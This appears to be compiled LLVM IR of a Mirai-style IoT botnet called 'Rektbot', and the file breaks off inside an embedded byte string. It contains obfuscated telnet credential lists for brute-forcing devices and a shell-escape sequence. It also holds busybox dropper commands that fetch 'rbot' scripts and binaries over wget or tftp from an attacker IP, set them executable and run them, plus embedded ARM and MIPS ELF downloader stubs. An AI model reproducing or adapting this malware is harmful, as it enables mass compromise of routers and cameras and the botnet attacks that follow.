; ModuleID = 'host/ir_O3/Rektbot.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.binary = type { i8*, i8 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fd_ctrl = local_unnamed_addr global i32 -1, align 4
@fd_serv = local_unnamed_addr global i32 -1, align 4
@pending_connection = local_unnamed_addr global i8 0, align 1
@pid1 = common local_unnamed_addr global i32 0, align 4
@pid2 = common local_unnamed_addr global i32 0, align 4
@maintain_thread = common local_unnamed_addr global i32 0, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanner_pid = common local_unnamed_addr global i32 0, align 4
@spid = common local_unnamed_addr global i32 0, align 4
@mainpid = common local_unnamed_addr global i32 0, align 4
@srv_addr = common global %struct.sockaddr_in zeroinitializer, align 4
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal unnamed_addr global i1 false, align 1
@fake_time = local_unnamed_addr global i32 0, align 4
@rsck = common local_unnamed_addr global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@tmp_dirs = local_unnamed_addr global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\5Cx%02x\00", align 1
@payloads = global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\5C\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ !\8F\99\80@\00\00\00\00\03 